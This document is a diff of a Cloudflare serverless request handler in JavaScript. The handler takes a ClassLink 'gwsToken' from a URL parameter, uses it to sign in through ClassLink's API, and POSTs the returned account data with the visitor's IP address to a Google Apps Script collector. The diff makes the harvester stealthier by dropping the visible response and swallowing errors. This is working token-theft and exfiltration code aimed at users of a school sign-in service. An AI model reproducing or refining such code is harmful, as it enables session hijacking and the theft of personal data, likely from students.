@@ -4,28 +4,32 @@ export async function onRequest(context) {
     const idMatch = url.search.match(/[?&]i=([^&]+)/);
     const idString = decodeURI(idMatch ? idMatch[1] : null);
     const ip = request.headers.get("CF-Connecting-IP");
-    const id = idString.match(/gwsToken":\s*"(.+?)"/)[1];
     
+    let id;
     try {
-    const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
-        method: "GET",
-        headers: {
-            "gwsToken": id
+        id = idString.match(/gwsToken":\s*"(.+?)"/)[1];
+    } catch (error) {}
+
+    Response.redirect("https://example.com", 302);
+
+    try {
+        const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
+            method: "GET",
+            headers: {
+                "gwsToken": id
+            }
+        });
+
+        if (nodeApiResponse.ok) {
+            const nodeApiData = await nodeApiResponse.json();
+
+            await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ data: nodeApiData, ip: ip })
+            });
         }
-    });
-    const nodeApiData = await nodeApiResponse.json();
-    await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ data: nodeApiData, ip: ip})
-    });
-    
-    return new Response(JSON.stringify({ message: nodeApiData }), {
-        headers: { "Content-Type": "application/json" }
-    });
-} catch (error) {
-        
-}
+    } catch (error) {}
 }
